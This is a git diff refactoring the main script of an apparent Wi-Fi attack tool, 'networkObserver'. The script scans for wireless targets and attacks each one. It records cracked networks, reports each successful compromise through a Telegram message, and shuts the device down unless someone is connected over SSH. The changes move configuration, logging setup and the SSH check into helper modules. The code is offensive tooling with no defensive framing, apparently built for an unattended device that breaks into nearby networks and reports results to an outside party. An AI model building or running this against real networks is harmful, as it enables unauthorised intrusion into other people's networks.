@@ -1,15 +1,13 @@
 import os
-import json
 import logging
 import subprocess
-
-from utils import clean_files
+from utils import clean_files, setup_logging, is_ssh_connected
 from constants import (
     TARGETS_FILE,
     CRACKED_FILE,
     ATTACK_INTERFACE,
-    REAVER_OUTPUT,
-    DEBUG_LOG
+    PCAP_FILE,
+    STOP_ON_SUCCESS
 )
 from wifi_scan import scan_targets
 from wifi_attack import attack_target
@@ -27,41 +25,14 @@ def has_internet():
     except subprocess.CalledProcessError:
         return False
 
-# Set working directory to /core
-os.chdir(os.path.dirname(os.path.abspath(__file__)))
 
-# Load config
-config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-try:
-    with open(config_path) as f:
-        config = json.load(f)
-    stop_on_success = config.get("stop_on_success", True)
-except Exception as e:
-    stop_on_success = True
-    print(f"[!] Failed to load config.json: {e}. Defaulting to stop_on_success=True")
+# Ensure logs directory exists + configure logging
+setup_logging()
 
-# Ensure logs directory exists
-os.makedirs(os.path.dirname(DEBUG_LOG), exist_ok=True)
-
-# Configure logging
-logging.basicConfig(
-    filename=DEBUG_LOG,
-    level=logging.DEBUG,
-    format="%(asctime)s [%(levelname)s] %(message)s"
-)
-
-# Also log to console
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
-console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
-logging.getLogger().addHandler(console)
-
-# Clear log file
-open(DEBUG_LOG, "w").close()
 logging.info("Starting networkObserver")
 
 # Clean temp files
-clean_files(TARGETS_FILE, CRACKED_FILE, REAVER_OUTPUT)
+clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
 logging.info("Temporary files cleaned.")
 
 # Scan for targets
@@ -85,7 +56,7 @@ while targets:
                 send_message(msg)
             else:
                 logging.warning("Connected, but no internet. Skipping Telegram message.")
-            if stop_on_success:
+            if STOP_ON_SUCCESS:
                 logging.info("Stopping after first successful compromise (as per config).")
                 break
         else:
@@ -96,17 +67,7 @@ while targets:
 logging.info("Process completed.")
 
 # Shutdown logic
-def is_ssh_active():
-    try:
-        output = subprocess.check_output(["ps", "-eo", "pid,ppid,user,args"]).decode()
-        for line in output.splitlines():
-            if "sshd:" in line and ("@pts" in line or "@tty" in line):
-                return True
-        return False
-    except Exception:
-        return False
-
-if is_ssh_active():
+if is_ssh_connected():
     logging.info("SSH session detected. Skipping shutdown.")
 else:
     logging.info("No SSH session. Proceeding with shutdown.")
